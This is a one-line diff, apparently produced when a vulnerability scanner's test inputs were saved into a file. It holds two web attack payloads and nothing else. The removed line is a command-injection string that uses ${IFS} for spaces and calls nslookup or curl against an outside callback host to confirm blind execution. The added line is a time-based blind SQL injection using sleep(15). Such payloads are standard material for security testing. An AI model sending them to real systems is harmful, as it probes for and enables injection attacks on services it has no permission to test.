@@ -1,1 +1,1 @@
-&(nslookup${IFS}-q${IFS}cname${IFS}hitowsdiadyioe0bb6.bxss.me||curl${IFS}hitowsdiadyioe0bb6.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitowsdiadyioe0bb6.bxss.me||curl${IFS}hitowsdiadyioe0bb6.bxss.me)&`'
+555*if(now()=sysdate(),sleep(15),0)
